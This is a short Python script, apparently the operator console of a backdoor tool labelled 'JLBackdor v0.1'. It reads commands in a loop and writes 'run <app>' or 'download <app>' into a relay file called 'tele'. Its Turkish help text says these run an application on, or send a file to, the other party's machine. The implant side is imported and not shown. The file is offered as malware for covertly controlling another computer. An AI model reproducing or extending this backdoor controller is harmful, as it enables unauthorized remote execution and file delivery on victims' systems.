from src import *
import os

with open("tele", "w")as f:
    f.write("")

banner = """
     ██╗██╗     ██████╗ 
     ██║██║     ██╔══██╗
     ██║██║     ██████╔╝
██   ██║██║     ██╔══██╗
╚█████╔╝███████╗██████╔╝
 ╚════╝ ╚══════╝╚═════╝ 
JLBackdor v0.1 @erenisik                
"""



if __name__ == "__main__":
    print(banner)
    while True:
        bash = input(">/>/>")
        if bash == "clear":
            try:
                os.system("cls")
            except:
                os.system("clear")
            print(banner)
        if bash == "run":
            runappname = input("<<<appname>>>")
            with open("tele", "w")as f:
                f.write(f"run {runappname}")
        if bash == "sendfile":
            with open("tele", "w")as f:
                sendappname = input("<<<appname>>>")
                f.write(f"download {sendappname}")
        if bash == "help":
            print(""" 
run (karşı tarafta istenen uygulama çalıştırılır)
sendfile (karşı tarafa istenilen uygulama gönderilir)
""")
        if bash == "exit":
            try:
                os.system("cls")
            except:
                os.system("clear")
            exit()